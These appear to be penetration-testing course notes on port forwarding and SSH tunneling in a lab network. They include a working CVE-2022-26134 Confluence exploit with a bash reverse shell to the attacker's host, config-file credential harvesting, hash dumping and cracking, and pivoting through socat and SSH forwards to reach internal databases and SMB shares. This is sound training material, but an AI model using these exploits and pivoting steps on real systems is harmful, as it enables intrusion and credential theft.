
**Tunneling:** Encapsulating a protocol within a different protocol
- Can carry a given protocol over an incompatible delivery network OR
- Provides a secure path through an untrusted network.

**Port Forwarding:** Traffic manipulation where we redirect traffic destined for 1 IP & port to another
![[rinetd.png]]


# Port Forwarding

#### Scenario
During an assessment, we discover a Linux web server (CONFLUENCE01) running a vulnerable version of Confluence.
During enumeration, we find that the server has 2 network interfaces:
	1 attached to the WAN in which our attack box (KALI) resides and
	1 attached to an internal subnet
In its config file, we find creds, IP address, and port for a PostgreSQL db instance on a server (PGDATABASE01) in that internal subnet

We want to gain access to that internal db and continue enumerating
As it stands KALI is in the WAN, PGDATABASE01 is in the DMZ, and CONFLUENCE01 is straddling both networks.

CONFLUENCE01 is listening on port 8090 on the WAN side
PGDATABASE01 is listening on port 5432 on the DMZ side - (likely a PostgreSQL server's default port)

#### Breakdown

To gain access to CONFLUENCE01, we'll need to leverage the RCE vuln in the Confluence web app to get a revshell

Researching for the vuln, CVE-2022-26134, we discover a **curl** command on a *Rapid7* blog which claims to exploit the vuln and throw back a shell
```bash
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```
Again, it's extremely important that we don't run scripts when we don't know what they do, so we'll need to examine this command before trusting it.

The verbose curl request is being made to **hxxp://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server.
The rest of the url needs to be decoded:
```java
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```
Resulting in an _OGNL injection_ payload.
- OGNL is Object-Graph Notation Language an expression language commonly used in Java applications.
- OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser.
- Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's *ProcessBuilder* class to spawn a *Bash* interactive reverse shell (bash -i).

As this payload fits our needs perfectly, we'll only need to change the victim's IP and port and the attacker's IP and port info.

Also need to take the URL encoding into account.
- The payload string in the proof-of-concept isn't completely URL encoded.
- Certain characters (notably ".", "-" and "/") are not encoded.  
Although it's not always the case, for _this_ particular exploit, this turns out to be important to the functioning of the payload.
- If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute.
- This means we can't apply URL encoding across the whole payload once we've modified it.


## [Socat](Tools.md#socat)

> Socat isn't typically installed by default on \*NIX systems.  It's possible to download and run a statically-linked binary version instead

- After enumerating `ip addr` & `ip route`, we discover two subnets
	- 192.168.247.63/24
	- 10.4.247.63/24
- Display routing table
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ routel
	/usr/bin/routel: 48: shift: can''t shift that many
	         target            gateway          source    proto    scope    dev tbl
	        default    192.168.153.254                   static          ens192 
	    10.4.153.0/ 24                     10.4.153.63   kernel     link ens224             #<NOTE new address
	 192.168.153.0/ 24                  192.168.153.63   kernel     link ens192 
	     10.4.153.0          broadcast     10.4.153.63   kernel     link ens224 local
	    10.4.153.63              local     10.4.153.63   kernel     host ens224 local
	   10.4.153.255          broadcast     10.4.153.63   kernel     link ens224 local
	      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
	     127.0.0.0/ 8            local       127.0.0.1   kernel     host     lo local
	      127.0.0.1              local       127.0.0.1   kernel     host     lo local
	127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
	  192.168.153.0          broadcast  192.168.153.63   kernel     link ens192 local
	 192.168.153.63              local  192.168.153.63   kernel     host ens192 local
	192.168.153.255          broadcast  192.168.153.63   kernel     link ens192 local
	            ::1                                      kernel              lo 
	            ::1              local                   kernel              lo local
```

- Knowing it's a Confluence server, check the configuration file
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
	<sian/application-data/confluence/confluence.cfg.xml   
	<?xml version="1.0" encoding="UTF-8"?>
	
	<confluence-configuration>
	  <setupStep>complete</setupStep>
	  <setupType>custom</setupType>
	  <buildNumber>8703</buildNumber>
	  <properties>
	...
	    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>                           #<-- NOTE password
	    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>    #<-- NOTE address/ port
	    <property name="hibernate.connection.username">postgres</property>                                    #<-- NOTE username
	...
	  </properties>
	</confluence-configuration>
```

- CONFLUENCE01 (192.168.247.63) is listening on port 8090
- PGDATABASE01 (10.4.247.215) is listening on port 5432 - (PostgreSQL server's default port)

How it should work:
- Open port 2345 on WAN interface of CONFLUENCE01 & connect to via Kali
- All packets sent to 2345 get forwarded by CONFLUENCE01 to port 5432 on PGDATABASE01
- Connecting to port 2345 on CONFLUENCE01 should be exactly like connecting directly to port 5432 on PGDATABASE01

![](port_forward_scenario.png)

- On CONFLUENCE01
```bash
	socat -ddd TCP-LISTEN:2345, fork TCP:10.4.247.215:5432 &
```
	-ddd - verbose
	TCP-LISTEN:2345 - Listener on port 2345
	fork - Fork into a new subprocess when it receives a connection instead of dying after a single connection
	TCP:10.4.5.215:5432 - Forward all traffic received to port 5432 on PGDATABASE01

- On Kali, use the [psql](Tools.md#psql) tool to interact with the PostgreSQL database
```bash
psql -h 192.168.247.63 -p 2345 -U postgres
	Password for user postgres: 
	psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
	Type "help" for help.
	
	postgres=#
```
	psql - Start a terminal-based front-end to PostgreSQL session
	-h 192.168.50.63 -p 2345 - Connect to CONFLUENCE01 on port 2345
	-U postgres - Use the *postgres* user account



Once prompted, enter the password discovered previously and run:
- `\l` command to list the available databases
- `\c confluence` command to work with the confluence database
- `\dt` command to display tables (if necessary)
- `select * from cwd_user;` command to dump the user table

```postgresql
 postgres=# \l
										List of databases
	    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
	------------+----------+----------+-------------+-------------+-----------------------
	 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
	 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
	 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
	            |          |          |             |             | postgres=CTc/postgres
	 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
	            |          |          |             |             | postgres=CTc/postgres
	(4 rows)

postgres=# \c confluence
	psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
	You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

	   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
	---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
	  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
	 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
	 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
	 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
	 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
	 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
	(6 rows)
	
	(END)
```



- We can then save the hashes `{PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC` to a text file and crack with **hashcat**
```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
	hashcat (v6.2.5) starting
	
	OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
	=====================================================================================================================================
	* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU. 
	
	Minimum password length supported by kernel: 0
	Maximum password length supported by kernel: 256
	
	...
	
	{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
	{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
	{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
	...
```


> Record all passwords for use later as they may have been reused.


- After further enumeration, we'll find PGDATABASE01 is also running an SSH server
```bash
nc -zv 10.4.247.63 1-1024 2>&1 | grep succeeded 
	Connection to 10.4.247.63 22 port [tcp/ssh] succeeded!
```

Will now need to create a port forward on CONFLUENCE01 which will allow ourselves to directly SSH into PGDATABASE01
- \*\*NOTE:  Will only work if you add ` &` to end of original socat command.  Otherwise, will be stuck w/in the command and attempting Ctrl+C will cancel your nc session!
```bash
# Kill original socat process
ps aux | grep socat
	conflue+    3157  0.0  0.0   6968  1772 ?        S    00:40   0:00 socat TCP-LISTEN:2345,fork TCP:10.4.153.247:5432
	conflue+    3225  0.0  0.0   6432   656 ?        S    00:42   0:00 grep socat

kill -9 3157

# Create socat tunnel to SSH server
socat TCP-LISTEN:2222,fork TCP:10.4.247.215:22

# In Kali, SSH in
ssh database_admin@192.168.247.63 -p 2222
```


# SSH Tunneling
aka SSH Port Forwarding

Encapsulating one kind of data stream within another as it travels across a network.

Benefits:
- Primarily a tunneling protocol, so it's possible to pass almost any kind of data through an SSH connection.
- Easily blends into the background traffic of network envs
- Often used by network admins for legitimate remote admin purposes
- Flexible port forwarding setups in restrictive network situations
- Common to find client software (or even SSH servers) already installed
- Contents cannot easily be monitored

Difference from previous Port Forwarding:
- Listening and Forwarding were done on the *same endpoint*
- SSH Tunneling
	- SSH connection is made between two endpoints
	- Listening port is opened by the *SSH client*
	- Packets are tunneled through the listening port to the *SSH server*
	- Packets are then forwarded through the server by the socket we specify

## Local Port Forward
- Can only connect to one socket per SSH Connection
#### Scenario
- Socat isn't available on CONFLUENCE01
- Still have creds cracked from the *confluence* database
- Still no firewall blocking the port we bind to
- Log into PGDATABASE01 with the _database_admin_ creds & see it's attached to another internal subnet (*ip addr,  routel*)
- Find a host w/ SMB server open (445) in that newly discovered subnet
- Utilize *database_admin* creds to set up SSH Local Port Forward through PGDATABASE01 to access HRSHARES

- CONFLUENCE01 - **192.168.163.63** LIstening 
- PGDATABASE01 - **10.4.163.215**
- HRSHARES - **172.16.163.217**


#### Execution
- Create an SSH port forward from  CONFLUENCE01 to PGDATABASE01
- Bind to a listening port on the WAN interface of CONFLUENCE01
- All packets sent to that port will be forwarded through the SSH tunnel to PGDATABASE01
- PGDATABASE01 will then forward these packets toward the SMB port on the newly discovered host

![](ssh-tunnel.new.png)

#### Breakdown

- As before, get a shell on CONFLUENCE01 using the cURL one-liner exploit for CVE-2022-26134
```bash
curl -v http://[CONFLUENCE01_IP]:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/[KALI_IP]/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```


- Knowing it's a Confluence server, check the configuration file
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
	...
	    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>                           #<-- NOTE password
	    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>    #<-- NOTE address/ port
	    <property name="hibernate.connection.username">postgres</property>                                    #<-- NOTE username
	...
```


> In order to SSH directly from CONFLUENCE01 to PGDATABASE01 we'll need to discover exactly which IP address and port we want the packets forwarded to

- Ensure that confluence shell has [TTY](Fully%20Interactive%20TTY.md) functionality
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# IF a Permission Denied error message occurs, try:
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

> For demonstration purposes, we're assuming we got the *database_admin* creds another way.

- From the reverse shell
```bash
ssh database_admin@10.4.163.215
	database_admin@10.4.163.215's password: sqlpass123
```

- Enumerate
```bash
ip addr
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
	    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	    inet 127.0.0.1/8 scope host lo
	       valid_lft forever preferred_lft forever
	    inet6 ::1/128 scope host 
	       valid_lft forever preferred_lft forever
	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
	    link/ether 00:50:56:bf:53:6e brd ff:ff:ff:ff:ff:ff
	    inet 10.4.163.215/24 brd 10.4.163.255 scope global ens192
	       valid_lft forever preferred_lft forever
	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
	    link/ether 00:50:56:bf:e7:13 brd ff:ff:ff:ff:ff:ff
	    inet 172.16.163.254/24 brd 172.16.163.255 scope global ens224
	       valid_lft forever preferred_lft forever

ip route
	default via 10.4.163.254 dev ens192 proto static
	10.4.163.0/24 dev ens192 proto kernel scope link src 10.4.163.215 
	172.16.163.0/24 dev ens224 proto kernel scope link src 172.16.163.254    #<--NOTE
```

- Use **nc** to scan for possible hosts
```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.163.$i 445 2>&1 | grep succeeded; done
	Connection to 172.16.163.217 445 port [tcp/microsoft-ds] succeeded!
```

> Now, in order to download anything discovered from that SMB share to our Kali machine, we'd either have to
1. Use whatever built-in tools we find on PGDATABASE01, download info to PGDATABASE01, then transfer back to CONFLUENCE01, *then* back to Kali
2. Create an SSH connection from CONFLUENCE01 to PGDATABASE01 utilizing a local port forward which would listen on port 4455 on the WAN interface of CONFLUENCE01, forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share.


- Kill the SSH connection to PGDATABASE01
```bash
ps aux | grep ssh
	root         880  0.0  0.3  12172  7272 ?        Ss   May20   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
	root        6115  0.0  0.4  13916  9020 ?        Ss   00:43   0:00 sshd: database_admin [priv]
	databas+    6218  0.0  0.2  14052  5284 ?        S    00:43   0:00 sshd: database_admin@pts/0      #<-- NOTE
	root        9019  0.0  0.4  13920  9048 ?        Ss   01:05   0:00 sshd: database_admin [priv]
	databas+    9112  0.0  0.2  14052  5944 ?        S    01:05   0:00 sshd: database_admin@pts/1      #<-- NOTE
	databas+   10429  0.0  0.0   6300   720 pts/1    S+   01:19   0:00 grep --color=auto ssh

kill -9 6218
	-bash: kill: (9) - Operation not permitted

ps aux | grep ssh
	root         880  0.0  0.3  12172  7272 ?        Ss   May20   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
	root        9019  0.0  0.4  13920  9048 ?        Ss   01:05   0:00 sshd: database_admin [priv]
	databas+    9112  0.0  0.2  14052  5944 ?        S    01:05   0:00 sshd: database_admin@pts/1
	databas+   10563  0.0  0.0   6300   656 pts/1    S+   01:21   0:00 grep --color=auto ssh

kill -9 9112
	Connection to 10.4.163.215 closed by remote host.
	Connection to 10.4.163.215 closed.

$ whoami
	confluence
```

- Setup a new connection to establish an SSH connection w/ args for a local port forward
```bash
ssh -N -L 0.0.0.0:4455:172.16.163.217:445 database_admin@10.4.163.215
```
	-L - Local port forward.  Takes args as two sockets:
	IP:PORT:IP:PORT - First socket is listening socket bound to the SSH client machine.  Second socket is where we want to forward the packets to.
	database_admin@10.4.163.215 - Rest of the SSH command is as usual; pointed at the SSH server and user we wish to connect as.

> If done correctly, after providing the SSH creds for database_admin, there'll be no output & it'll look like it's hanging


- Since this reverse shell from CONFLUENCE01 is now occupied with an open SSH session, we need to catch another reverse shell from CONFLUENCE01.
	- We can do this by listening on another port and modifying our CVE-2022-26134 payload to return a shell to that port.
```bash
# Kali tab 1
nc -nlvp 4444

# Kali tab 2
curl -v http://192.168.163.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.154/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

- Confirm SSH process on CONFLUENCE01
```bash
ss -ntplu
	Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                 ...
	tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=5825,fd=4))                                          ...
```

![](ssh-tunnel.new1.png)

- From Kali, list available shares via **smbclient** & download files
```bash
smbclient -p 4455 -L //192.168.163.63/ -U hr_admin --password=Welcome1234
	Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk

smbclient -p 4455 //192.168.163.63/Scripts -U hr_admin --password=Welcome1234
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Tue Sep 13 04:37:59 2022
	  ..                                 DR        0  Tue Sep  6 11:02:37 2022
	  Provisioning.ps1                   AR     1806  Mon May 20 19:35:04 2024

	smb: \> get Provisioning.ps1
		getting file \Provisioning.ps1 of size 1806 as Provisioning.ps1 (7.1 KiloBytes/sec) (average 7.1 KiloBytes/sec)


cat Provisioning.ps1 
	��<# 
	This script will create the flag_admin user and set the flag as the password.
	WARNING: Do not run this in production using system account.
	Last update: September 12, 2022
	Last Updated By: Alice Admin
	Duration: Unknown
	Output: User created
	#>
	
	#Requires -RunAsAdministrator
	
	$Flag="OS{9cb81c7a0a2428927386732978ebe2c3}";
	
	$SecurePassword = $Flag | ConvertTo-SecureString -AsPlainText -Force
	
	try {
	    Write-Output "Searching for $Username in LocalUser DataBase"
	    $UserAccount = Get-LocalUser $Username
	    Write-Warning "$Username already exists, just going to reset password."                                               
	    $UserAccount | Set-LocalUser -Password $SecurePassword                                                                
	} catch [Microsoft.PowerShell.Commands.UserNotFoundException] {                                                           
	    Write-Output "$Username not found, creating the whole user."                                                          
	    New-LocalUser $Username -Password $SecurePassword -FullName "FLAG USER" -Description "Flag User"
```



## Local Dynamic Port Forward
- Created with the **-D** flag & only requires the arg IP:PORT we want to bind to.
- From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.
- Listening port created is a SOCKS proxy server port.
	- Accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed
	- Only limitation is that the packets have to be properly formatted - most often by SOCK-compatible client software.
		- In some cases, software is not SOCKS-compatible by default
		- Need to ensure that whatever software we use can send packets in the correct SOCKS protocol format


#### Scenario
- Socat isn't available on CONFLUENCE01
- Still have creds cracked from the *confluence* database
- Still no firewall blocking the port we bind to
- SSH into PGDATABASE01 with the _database_admin_ creds & see it's attached to another internal subnet (*ip addr,  routel*)
- Find a host w/ SMB server open (445) in that newly discovered subnet
- Kill SSH connection & setup Dynamic Port Forward
- Connect to SMB server ***AND*** do a full port scan on it

- CONFLUENCE01 - **192.168.233.63**
- PGDATABASE01 - **10.4.233.215**
- HRSHARES - **172.16.233.217**

![](ssh-tunnel-dynamic.png)

#### Execution

- As done previously, utilize the Confluence CVE to establish a reverse shell with CONFLUENCE01
- Upgrade TTY: `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- Assume all enumeration has been done and we've discovered all previously found data from previous sections

- Craft Dynamic Port Forwarding using SSH Tunneling through PGDATABASE01 to HRSHARES
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.233.215
	Could not create directory '/home/confluence/.ssh'.
	The authenticity of host '10.4.233.215 (10.4.233.215)' can't be established.
	ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	yes
	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
	database_admin@10.4.233.215's password: sqlpass123
```

> smbclient doesn't natively provide an option to use a SOCKS proxy, so we can't use it here.
> Will need to use [Proxychains](Tools.md#proxychains)
> - Tool that can force network traffic from third party tools over HTTP or SOCKS proxies & be configured to push traffic over a _chain_ of concurrent proxies.

- Edit config file to ensure that Proxychains can locate our SOCKS proxy port, and confirm that it's a SOCKS proxy
```bash
vim /etc/proxychains4.conf
	...
		[ProxyList]
	# add proxy here ...
	# meanwile
	# defaults set to "tor"
	# socks4  127.0.0.1 9050
	socks5 192.168.233.63 9999     #<-- NOTE: CONFLUENCE01 socket
```

> Rather than connecting to the port on CONFLUENCE01, we'll write the **smbclient** command as though we have a direct connection to PGDATABASE01

```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:445  ...  OK
	
	        Sharename       Type      Comment
	        ---------       ----      -------
	        ADMIN$          Disk      Remote Admin
	        C$              Disk      Default share
	        IPC$            IPC       Remote IPC
	        Scripts         Disk      
	        Users           Disk      
	Reconnecting with SMB1 for workgroup listing.
	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:139  ...  OK
	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:139  ...  OK
	do_connect: Connection to 172.16.233.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available
```

- Escalate and conduct a port scan
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 18:25 EDT
	Initiating Parallel DNS resolution of 1 host. at 18:25
	Completed Parallel DNS resolution of 1 host. at 18:25, 0.05s elapsed
	DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 18:25
	Scanning 172.16.233.217 [20 ports]
	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:111 <--socket error or timeout!
	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:3389  ...  OK
	Discovered open port 3389/tcp on 172.16.233.217
	RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
	...
	Completed Connect Scan at 18:28, 124.20s elapsed (20 total ports)
	Nmap scan report for 172.16.233.217
	Host is up, received user-set (6.5s latency).
	Scanned at 2024-05-23 18:25:58 EDT for 124s
	
	PORT     STATE  SERVICE       REASON
	21/tcp   closed ftp           conn-refused
	22/tcp   closed ssh           conn-refused
	23/tcp   closed telnet        conn-refused
	25/tcp   closed smtp          conn-refused
	53/tcp   closed domain        conn-refused
	80/tcp   closed http          conn-refused
	110/tcp  closed pop3          conn-refused
	111/tcp  closed rpcbind       conn-refused
	135/tcp  open   msrpc         syn-ack
	139/tcp  open   netbios-ssn   syn-ack
	143/tcp  closed imap          conn-refused
	443/tcp  closed https         conn-refused
	445/tcp  open   microsoft-ds  syn-ack
	993/tcp  closed imaps         conn-refused
	995/tcp  closed pop3s         conn-refused
	1723/tcp closed pptp          conn-refused
	3306/tcp closed mysql         conn-refused
	3389/tcp open   ms-wbt-server syn-ack
	5900/tcp closed vnc           conn-refused
	8080/tcp closed http-proxy    conn-refused
	
	Read data files from: /usr/bin/../share/nmap
	Nmap done: 1 IP address (1 host up) scanned in 124.27 seconds
```


> By default, Proxychains is configured with very high time-out values. This can make port scanning really slow.
> Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.



## Remote Port Forward

Thus far, port forwarding has been unrestricted:
- Been able to connect to bind ports
- Been able to compromise SSH passwords/ keys to SSH *into* a network

In the real world, hardware and software firewalls are prevalent and utilized to prevent most incoming network traffic.
- Inbound connections are more easily and more aggressively restricted than outbound

Outbound connections are more difficult to control than inbound connections. Most corporate networks will allow many types of common network traffic out - including SSH - for reasons of simplicity, usability, and business need. So while it likely won't be possible to connect to a port we bind to the network perimeter, it will often be possible to SSH out.
- Like a reverse shell only with SSH port forwarding
	- The listening port is bound to the SSH server.
	- Packets are forwarded by the SSH client.

#### Scenario
- Compromise CONFLUENCE01 using CVE-2022-26134
- Firewall is implemented at the perimeter
	- Configured so that the only port we can connect to from our Kali machine is TCP 8090
	- Can't create any port forward that requires opening the listening port on CONFLUENCE01.
- Still want to enumerate the PostgreSQL database running on port 5432 on PGDATABASE01.
- CONFLUENCE01 _does_ have an SSH client, and we can set up an SSH server on our Kali machine.
- Connect from CONFLUENCE01 to our Kali machine over SSH.
	- The listening TCP port 2345 is bound to the loopback interface on our Kali machine.
	- Packets sent to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01.
	- They are then forwarded to the PostgreSQL database port on PGDATABASE01
- **CONFLUENCE01** - 192.168.193.63
- **PGDATABASE01** - 10.4.193.215

![](remote_port_forward_scenario.png)

#### Execution

- Enable the SSH server on Kali & verify SSH port is open
```bash
sudo systemctl start ssh

udo ss -ntplu
	Netid       State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port       Process  
	...
	tcp         LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*           users:(("sshd",pid=2153,fd=3))
	tcp         LISTEN       0            128                         [::]:22                          [::]:*           users:(("sshd",pid=2153,fd=4))
```
	- SSH server is listening on port 22 for all interfaces for IPv4 & IPv6

- Once we get a reverse shell from CONFLUENCE01, ensure a TTY shell, then create an SSH remote port forward as part of an SSH connection back to our Kali
```bash
# CONFLUENCE01 revshell
python3 -c 'import pty; pty.spawn("/bin/sh")'

# SSH Remote Port Forward
ssh -N -R 127.0.0.1:2345:10.4.193.215:5432 kali@192.168.45.196
```
	- 127.0.0.1:2345 - Listen on port **2345** on our Kali machine
	- 10.4.193.215:5432 - Forward all traffic to PostgreSQL port on PGDATABASE01

- Verify connection and exploit PGDATABASE01
```bash
ss -ntplu
	Netid          State           Recv-Q          Send-Q                   Local Address:Port                      Peer Address:Port          Process
	...
	tcp            LISTEN          0               128                          127.0.0.1:2345                           0.0.0.0:*
	...

psql -h 127.0.0.1 -p 2345 -U postgres
	Password for user postgres: D@t4basePassw0rd!
	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
